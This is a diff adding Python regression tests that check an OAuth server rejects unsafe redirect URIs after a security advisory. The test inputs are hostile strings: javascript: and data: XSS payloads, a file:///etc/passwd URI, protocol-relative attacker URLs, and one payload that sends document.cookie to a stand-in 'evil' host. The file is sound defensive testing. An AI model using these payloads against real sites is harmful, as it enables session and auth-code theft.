@@ -325,3 +325,223 @@ class MCPBearerTokenLookupTests(unittest.IsolatedAsyncioTestCase):
             _compiled_in_values(token_query, "access_token_1"),
             list(oauth_token_lookup_values(raw_token)),
         )
+
+
+class TestValidateRedirectUri(unittest.TestCase):
+    """Tests for OAuth redirect_uri validation. GHSA-pm6h-x3h5-j38h finding H3.
+
+    The server must reject unsafe redirect URIs (javascript:, data:, file:,
+    protocol-relative //attacker.com, fragments, non-https for non-localhost)
+    at both registration and authorize time.
+    """
+
+    def test_validate_rejects_javascript_scheme(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("javascript:alert(1)")
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
+
+    def test_validate_rejects_data_scheme(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("data:text/html,<script>alert(1)</script>")
+        self.assertEqual(ctx.exception.status_code, 400)
+
+    def test_validate_rejects_file_scheme(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("file:///etc/passwd")
+        self.assertEqual(ctx.exception.status_code, 400)
+
+    def test_validate_rejects_protocol_relative_url(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("//attacker.example/callback")
+        # urlparse parses //attacker.com with scheme="" -- caught by the not-scheme check.
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertIn("scheme", ctx.exception.detail["error_description"])
+
+    def test_validate_rejects_empty_string(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("")
+        self.assertEqual(ctx.exception.status_code, 400)
+
+    def test_validate_rejects_fragment(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("https://example.com/callback#fragment")
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertIn("fragment", ctx.exception.detail["error_description"])
+
+    def test_validate_rejects_non_https_for_non_localhost(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        with self.assertRaises(HTTPException) as ctx:
+            _validate_redirect_uri("http://example.com/callback")
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertIn("https", ctx.exception.detail["error_description"])
+
+    def test_validate_accepts_https(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        # Should not raise.
+        _validate_redirect_uri("https://example.com/callback")
+        _validate_redirect_uri("https://app.example.com/oauth/callback?foo=bar")
+
+    def test_validate_accepts_localhost_http(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        # Local development exemption -- http:// is allowed for localhost variants.
+        _validate_redirect_uri("http://localhost:3000/callback")
+        _validate_redirect_uri("http://127.0.0.1:8080/callback")
+        _validate_redirect_uri("http://[::1]:9000/callback")
+
+    def test_validate_accepts_https_localhost(self) -> None:
+        from app.api.oauth import _validate_redirect_uri
+
+        _validate_redirect_uri("https://localhost:3000/callback")
+
+
+class TestRedirectUriEndpointRegression(unittest.IsolatedAsyncioTestCase):
+    """Endpoint-level regression tests for GHSA-pm6h-x3h5-j38h finding H3.
+
+    The helper-level tests in TestValidateRedirectUri verify _validate_redirect_uri
+    in isolation. These tests verify the actual HTTP endpoints reject unsafe URIs:
+
+    1. register_client rejects an unsafe redirect_uri at registration time.
+    2. authorize_get rejects an unsafe redirect_uri (legacy client registered before fix).
+    3. authorize_post rejects an unsafe redirect_uri (the path that issues the auth code
+       and returns the 302 -- the most critical path to cover).
+    """
+
+    async def test_register_rejects_javascript_redirect_uri(self) -> None:
+        """register_client must reject a javascript: redirect_uri at registration."""
+        request = SimpleNamespace(
+            headers={},
+            client=SimpleNamespace(host="127.0.0.1"),
+            json=AsyncMock(
+                return_value={
+                    "client_name": "Malicious Client",
+                    "redirect_uris": ["javascript:fetch('https://evil/'+document.cookie)"],
+                    "token_endpoint_auth_method": "none",
+                }
+            ),
+        )
+        db = AsyncMock()
+        db.add = MagicMock()
+
+        with patch("app.api.oauth.oauth_register_limiter.is_allowed", return_value=(True, None)):
+            with self.assertRaises(HTTPException) as ctx:
+                await register_client(request, db)
+
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
+        db.add.assert_not_called()
+
+    async def test_register_rejects_protocol_relative_redirect_uri(self) -> None:
+        """register_client must reject a protocol-relative //attacker.com redirect_uri."""
+        request = SimpleNamespace(
+            headers={},
+            client=SimpleNamespace(host="127.0.0.1"),
+            json=AsyncMock(
+                return_value={
+                    "client_name": "Malicious Client",
+                    "redirect_uris": ["//attacker.example/callback"],
+                    "token_endpoint_auth_method": "none",
+                }
+            ),
+        )
+        db = AsyncMock()
+        db.add = MagicMock()
+
+        with patch("app.api.oauth.oauth_register_limiter.is_allowed", return_value=(True, None)):
+            with self.assertRaises(HTTPException) as ctx:
+                await register_client(request, db)
+
+        self.assertEqual(ctx.exception.status_code, 400)
+        db.add.assert_not_called()
+
+    async def test_authorize_get_rejects_legacy_unsafe_redirect_uri(self) -> None:
+        """authorize_get must reject an unsafe redirect_uri even if a legacy client
+        has it registered (clients registered before the fix must be covered).
+        """
+        client = SimpleNamespace(
+            client_id="legacy-client",
+            client_name="Legacy Client",
+            redirect_uris=["javascript:alert(1)"],  # registered before fix
+            is_confidential=False,
+        )
+        db = AsyncMock()
+        db.execute = AsyncMock(return_value=_query_result(client))
+
+        with self.assertRaises(HTTPException) as ctx:
+            await authorize_get(
+                request=_request(method="GET", path="/authorize"),
+                client_id=client.client_id,
+                redirect_uri="javascript:alert(1)",
+                db=db,
+            )
+
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
+
+    async def test_authorize_post_rejects_legacy_unsafe_redirect_uri(self) -> None:
+        """authorize_post must reject an unsafe redirect_uri even if a legacy client
+        has it registered. This is the most critical path: it issues the auth code
+        and returns the 302. Without the fix, the 302 Location would contain
+        javascript:...?code=<auth_code>, leaking the code.
+        """
+        client = SimpleNamespace(
+            client_id="legacy-client",
+            client_name="Legacy Client",
+            redirect_uris=["javascript:alert(1)"],  # registered before fix
+            is_confidential=False,
+        )
+        user = SimpleNamespace(id=uuid.uuid4(), email="user@example.com", hashed_password="hash")
+        db = AsyncMock()
+        db.add = MagicMock()
+        db.flush = AsyncMock()
+        db.execute = AsyncMock(
+            side_effect=[
+                _query_result(client),
+                _query_result(user),
+            ]
+        )
+
+        with patch("app.api.oauth.verify_password", return_value=True):
+            with self.assertRaises(HTTPException) as ctx:
+                await authorize_post(
+                    request=_request(
+                        path="/authorize",
+                        data={
+                            "client_id": client.client_id,
+                            "redirect_uri": "javascript:alert(1)",
+                            "scope": "mcp",
+                            "state": "state-123",
+                            "code_challenge": _pkce_challenge("verifier"),
+                            "code_challenge_method": "S256",
+                            "csrf_token": _generate_csrf_token(client.client_id),
+                            "email": user.email,
+                            "password": "secret",
+                        },
+                    ),
+                    db=db,
+                )
+
+        self.assertEqual(ctx.exception.status_code, 400)
+        self.assertEqual(ctx.exception.detail["error"], "invalid_client_metadata")
+        # No auth code should have been issued.
+        db.add.assert_not_called()
+        db.flush.assert_not_awaited()
+
+
+if __name__ == "__main__":
+    unittest.main()
